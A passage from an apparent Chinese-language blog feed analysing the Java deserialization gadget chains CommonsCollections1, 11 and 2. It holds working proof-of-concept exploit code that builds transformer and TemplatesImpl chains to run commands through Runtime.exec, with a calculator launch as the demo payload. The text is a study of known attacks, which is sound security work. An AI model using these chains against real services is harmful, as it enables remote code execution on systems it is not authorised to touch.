class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">CommonsCollections1利用链分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections11利用链分析</title>
    <link href="http://example.com/2022/11/10/CommonsCollections11/"/>
    <id>http://example.com/2022/11/10/CommonsCollections11/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:55:32.429Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections11利用链分析"><a href="#CommonsCollections11利用链分析" class="headerlink" title="CommonsCollections11利用链分析"></a>CommonsCollections11利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections11</code>链子的利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本暂无</span><br></pre></td></tr></table></figure><p>可能学到这里，你和我一样会有一个疑问：<code>CommonsCollections6</code>已经通杀<code>3.1-3.2.1</code>的情况下，为什么还要学该版本下的其他链子？</p><p>个人觉得<code>CommonsCollection11</code>的存在是为了解决在<code>CommonsCollections 3.1 - 3.2.1</code>的版本下加载恶意字节码的问题。除此之外，<code>CommonsCollections6</code>在<code>shiro</code>中使用时会报错，至于为什么，具体答案留到<code>shiro</code>章节学习时再进行解惑。</p><p>这里提到恶意字节码，很快能想到前面学习的<code>CommonsCollections2</code>这条链子，聪明的你应该已经能想到了，<code>CommonsCollections11</code>就是<code>CommonsCollections2</code>和<code>CommonsCollections6</code>结合而来。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先回忆一下，<code>CommonsCollections2</code>链子只所以限制版本为<code>CommonsCollections 4.0</code>，则是因为 gadget 中用到了<code>TransformingComparator</code>类，而该类只有在 4.0 版本的时候才实现了<code>serializable</code>接口。</p><p>在<code>3.1 - 3.2.1</code>版本的时候无法使用该类，而是使用了<code>CommonsCollections6</code>中的<code>TiedMapEntry</code>类来触发<code>LazyMap#get()</code>，最后执行<code>transform()</code>方法。接下来还剩一个问题，就是如何触发<code>TemplatesImpl#newTransformer()</code>方法来加载恶意字节码？</p><p>在<code>CommonsCollections11</code>中只单独使用<code>InvokerTransformer</code>类，通过反射修改<code>iMethodName</code>为<code>newTransformer()</code>方法。 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/12 15:50</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections11</span> <span class="variable">commonsCollections11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections11</span>();</span><br><span class="line">        commonsCollections11.serialize();</span><br><span class="line">        commonsCollections11.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        <span class="comment">// 通过反射修改iMethodName值为newTransformer</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221012163340954.png" alt="image-20221012163340954"></p><p>通过把<code>TemplatesImpl</code>类对象<code>templates</code>作为<code>TiedMapEntry</code>类的<code>key</code><br><img src="images/image-20221012163435957.png" alt="image-20221012163435957"></p><p>执行到<code>LazyMap#get()</code>方法时，成功触发到<code>TemplatesImpl#newTransformer()</code>方法加载恶意类</p>]]></content>
    
    
    <summary type="html">CommonsCollections11利用链分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections2利用链分析</title>
    <link href="http://example.com/2022/11/10/CommonsCollections2/"/>
    <id>http://example.com/2022/11/10/CommonsCollections2/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:53:10.794Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections2利用链分析"><a href="#CommonsCollections2利用链分析" class="headerlink" title="CommonsCollections2利用链分析"></a>CommonsCollections2利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections2</code>利用链利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 4.0</span><br><span class="line">JDK 版本暂无限制</span><br><span class="line">需要 javassist(伪条件，具体见下文)</span><br></pre></td></tr></table></figure><p>可以看到，在 cc2 是针对<code>CommonsCollections 4.0</code>新版本的利用链，环境配置 Maven 依赖如下（需要 javassist 的原因在下文）：<br><img src="images/image-20221009105637369.png" alt="image-20221009105637369"></p><p>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>我们就跟着链子逐步探究一番。</p><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>看<code>PriorityQueue#readObject()</code>方法源码<br><img src="images/image-20221009112426049.png" alt="image-20221009112426049"></p><p>可以看到对传入的对象输入流<code>s</code>进行反序列化并传入到<code>queue</code>数组中，说明<code>s</code>是经过序列化后的数据，那么接着看<code>writeObject()</code>序列化方法<br><img src="images/image-20221009112818375.png" alt="image-20221009112818375"></p><p>其中对<code>queue</code>数组遍历进行序列化，而<code>queue</code>是<code>PriorityQueue</code>类的一个属性，那么我们可以通过反射进行控制，所以<code>queue</code>成为可控点。<br><img src="images/image-20221009112947079.png" alt="image-20221009112947079"></p><p>前面可以看到<code>readObject()</code>方法最后还调用了<code>heapify()</code>方法，我们接着跟<code>heapify()</code><br><img src="images/image-20221009113211379.png" alt="image-20221009113211379"></p><p><code>headify()</code>方法进行循环并调用了<code>siftDown()</code>方法，其中第二个参数<code>queue</code>是可控点，继续跟进<code>siftDown()</code>源码<br><img src="images/image-20221009113328581.png" alt="image-20221009113328581"></p><p>这里做了一个判断，如果<code>comparator</code>不为空，则进入<code>siftDownUsingComparator(k, x)</code>方法。<br><img src="images/image-20221009113434631.png" alt="image-20221009113434631"></p><p>这里<code>comparator</code>也是<code>PriorityQueue</code>类的一个属性，因此也可以通过反射进行控制。此外，因为前面的<code>queue</code>是可控的，所以这里<code>siftDownUsingComparator(k, x)</code>的<code>x</code>也是可控的。</p><p>继续跟进<code>siftDownUsingComparator()</code>方法源码<br><img src="images/image-20221009113836865.png" alt="image-20221009113836865"></p><p>可以看到这里调用到了<code>comparator.compare()</code>方法，而<code>comparator</code>是可控的，并且<code>comparator(x,c)</code>中的<code>x</code>也是可控的。</p><p>根据利用链可以看到<code>comparator</code>被赋值为<code>TransformingComparator</code>，接下来到了<code>TransformingComparator.compare()</code>方法。</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><p>跟进<code>TransformingComparator#compare()</code>方法<br><img src="images/image-20221009120104239.png" alt="image-20221009120104239"></p><p>可以看到会执行<code>this.transformer.transform()</code>方法，并且<code>this.transformer</code>在前面构造参数方法的时候进行赋值，因此也是可控点。这里可以根据前面学习的<code>CommonsCollections1</code>开始构造 POC 了。</p><p>在构造 POC 前，发现<code>ysoserial</code>中的<code>queue</code>添加了两个元素<br><img src="images/image-20221009121010160.png" alt="image-20221009121010160"></p><p>这是为啥捏？回去重新跟一下，发现原来是要满足在<code>heapify()</code>方法的操作，如果只有一个元素则<code>size</code>为 1，最后经过无符号右移动 1 位并且减 1 ，则结果为 -1 将无法进入<code>siftDown()</code>方法<br><img src="images/image-20221009121552839.png" alt="image-20221009121552839"></p><p>补充一下，<code>TransformingComparator</code>类只有在<code>CommonsCollections4.0</code>的时候才实现<code>serializable</code>接口，因此才可以进行序列化与反序列化。<br><img src="images/image-20221012154454936.png" alt="image-20221012154454936"></p><p>这也是为什么<code>CommonsCollections2</code>限制了利用版本在<code>CommonsCollections4.0</code>的原因。</p><h2 id="构造-POC"><a href="#构造-POC" class="headerlink" title="构造 POC"></a>构造 POC</h2><p>根据以上学习，利用链已经清晰明了，构造 POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        commonsCollections2.serialize();</span><br><span class="line">        commonsCollections2.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> 